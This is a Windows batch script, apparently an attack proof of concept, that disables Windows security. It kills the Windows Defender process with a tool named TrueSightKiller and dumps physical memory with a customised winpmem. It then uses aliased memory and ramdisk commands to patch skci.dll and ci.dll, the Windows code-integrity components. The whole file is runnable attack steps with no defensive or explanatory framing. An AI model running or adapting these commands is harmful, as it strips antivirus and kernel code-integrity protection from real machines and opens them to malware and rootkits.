@echo off

echo [+] Attempting to Disable Windows Defender 
TrueSightKiller.exe -n msmpeng.exe

echo [+] Dumping Aliased Memory 
winpmem_custom.exe -a -0 current.raw

echo [+] Descrambling Aliased Memory Dump 
helper.exe current.raw current_decoded.raw

for /f "usebackq delims=" %%A in (`ci_finder_end2end.exe current_decoded.raw`) do (
    set "RESULT=%%A"
)

echo [+] Initializing aliased memory for skci patch

rxprd im enable -n -rsvd 70 -q 5 -s

echo [+] Patching skci.dll 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -s
rxprd save 0 -a C:\Users\AutoTomBot\Desktop\mini.vdf -F FLAT -s 
rxprd del 0 -s

helper.exe mini.vdf mini_decoded.vdf
patcher_canary_dec9.exe mini_decoded.vdf 0 1 2 3 4 5
helper.exe patched_output.bin mini_patched.vdf 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -image C:\Users\AutoTomBot\Desktop\mini_patched.vdf -s
rxprd del 0 -s 

echo [+] Patched Delivered

echo [+] Found ci ramdisk candidate at %RESULT%

echo [+] Initializing aliased memory for ci patch

rxprd im enable -n -rsvd %RESULT% -q 5 -s

echo [+] Patching ci.dll 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -s
rxprd save 0 -a C:\Users\AutoTomBot\Desktop\mini.vdf -F FLAT -s
rxprd del 0 -s

helper.exe mini.vdf mini_decoded.vdf
patcher_canary_dec9.exe mini_decoded.vdf 6 7 8 9 10
helper.exe patched_output.bin mini_patched.vdf 

rxprd add -n 3 -t DIO -v -i -fs FAT -l RAMDISK -F flat -image C:\Users\AutoTomBot\Desktop\mini_patched.vdf -s
rxprd del 0 -s

echo [+] Patched Delivered

echo [+] Attempting to Disable Windows Defender 
TrueSightKiller.exe -n msmpeng.exe


